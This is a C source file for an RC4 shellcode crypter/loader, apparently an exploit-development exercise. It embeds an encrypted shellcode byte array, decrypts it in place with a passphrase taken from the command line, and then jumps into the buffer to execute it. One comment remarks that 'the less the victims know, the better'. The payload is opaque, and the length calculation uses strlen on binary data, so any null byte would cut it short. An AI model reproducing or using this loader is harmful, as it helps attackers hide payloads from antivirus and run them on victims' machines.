/**
	File: RC4_crytper.c

	input: arg[1] --> passphrase key

*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>


#define ARRAY_LENGTH	256				// macro definition of array length to be 256 for 256 byte of possible keysize/length



unsigned char keystream[ARRAY_LENGTH];			// defining globals
int rc4_i;						// includes the key array, and two internal counters, rc4_i and rc4_j
int rc4_j;	


// shellcode to be encrypted 
unsigned char encrypted_shellcode[] = \
"\x34\xfb\x93\x8f\xe0\xea\x19\x3b\x6a\xb3\xf0\x7d\xa9\x7a\x16\x05\x83\xfe\xa1\x02\x87\x01\x1f\x48\x53\x52\x5a\x40\x2f\x76\xd1\xe5\xbe\x58\x9e\xb2\x01\x0b\x55\x64\xbb\x0e\x55\x03\x0b\xa1\x97\x8b\x6f\xb5\x38\x31\xfc";




void swap(unsigned char* ks1, unsigned char* ks2);
void RC4_init(void);
void RC4_KSA(unsigned char* key, int key_length);
int RC4_PRNG(void);

int main(int argc, char** argv)
{
	unsigned char* encryption_key;			// variable declaration
	int encryption_key_length;

	unsigned char data_byte;
	unsigned char keystream_byte;
	unsigned char encrypted_byte;

	int encrypted_shellcode_length;
	int counter;
	int (*decrypted_sh)() = (int(*)())encrypted_shellcode;		// sets up the decrptyed shellcode pointer function so we can call it 
									// decryption is done

	encryption_key = (unsigned char*)argv[1];			// type casted unsigned char string for first argv[1] from stdin
	encryption_key_length = strlen( (char*)encryption_key );	// type chasted char string to use strlen 

	if (encryption_key_length > ARRAY_LENGTH)
	{
		printf("[!] Key too big. Should be <= 256 characters.\n\n");	
		printf("[!] Exiting...\n");
		exit(-1);						// error code -1 for too big of key input
	}

	RC4_init();							// initialize RC4 key array
	
	RC4_KSA(encryption_key, encryption_key_length);			// scrambles key array

	encrypted_shellcode_length = strlen( (char*)encrypted_shellcode );
	
	printf("[*] Decrypting shellcode ... \n\n\n");

	for (counter = 0; counter < encrypted_shellcode_length; counter++)	// encrypt each byte
	{
// next four lines are from the encrypter, left here for logic comparison

//		data_byte = encrypted_shellcode[counter];		// obtain a shellcode byte
//		keystream_byte = RC4_PRNG();				// obtain a keystream byte
	
//		encrypted_byte = data_byte ^ keystream_byte		// obtain encrypted byte by XOR of the two previous bytes
		
//		printf("\\x%02x", encrypted_data);			// output to screen, NOTE: no new line at the end, we want the entire str

		// instead like the encrypter
		// we will need to overwrite the original encrypted_shellcode variable 
		// so we can run it later as the decrypted shellcode
		
		// encrypter would have had to print out the decrypted output instead of actually executing it

		encrypted_shellcode[counter] = encrypted_shellcode[counter] ^ RC4_PRNG();

	}

// NOTE: a real attacker would not have so many writes to stdout in an attack. The less the victims know, the better.

	printf("[*] Executing the decrypted shellcode...\n\n\n");
	
	decrypted_sh();							// execute decrypted shellcode

	return 0;

}


void RC4_init(void)
{
	int i;
	
	for (i = 0; i < ARRAY_LENGTH; i++)				// initialize keystream array in sequential order, ie 0,1,2,3,4...255
		keystream[i] = i;
	
	rc4_i = rc4_j = 0;						// initalize rc4 counters
}

void RC4_KSA(unsigned char* key, int key_length)			// scrambles they keystream array using the following
{
	for (rc4_i = 0; rc4_i < ARRAY_LENGTH; rc4_i++)
	{
		rc4_j = (rc4_j + keystream[rc4_i] + key[rc4_i % key_length]) % ARRAY_LENGTH;
		swap(&keystream[rc4_i], &keystream[rc4_j]);
	}
	
	rc4_i = rc4_j = 0;						// reset rc4 counters for the PRNG function

}

int RC4_PRNG(void)
{
	rc4_i = (rc4_i + 1) % ARRAY_LENGTH;				// everytime this is called, rc4_i increases by 1, up to 255
	rc4_j = (rc4_j + keystream[rc4_i]) % ARRAY_LENGTH;

	swap(&keystream[rc4_i], &keystream[rc4_j]);			// more scrambling

									// returning a value from keystream to be xored with data
									// this value is taken after the second scrambling done above
	return keystream[ ( keystream[rc4_i] + keystream[rc4_j] ) % ARRAY_LENGTH ];
				
}

void swap(unsigned char* ks1, unsigned char* ks2)
{
	char temp = *ks1;						// deferences ks1 and put it into temp var
	
	*ks1 = *ks2;							// swaping the values

	*ks2 = temp;

}


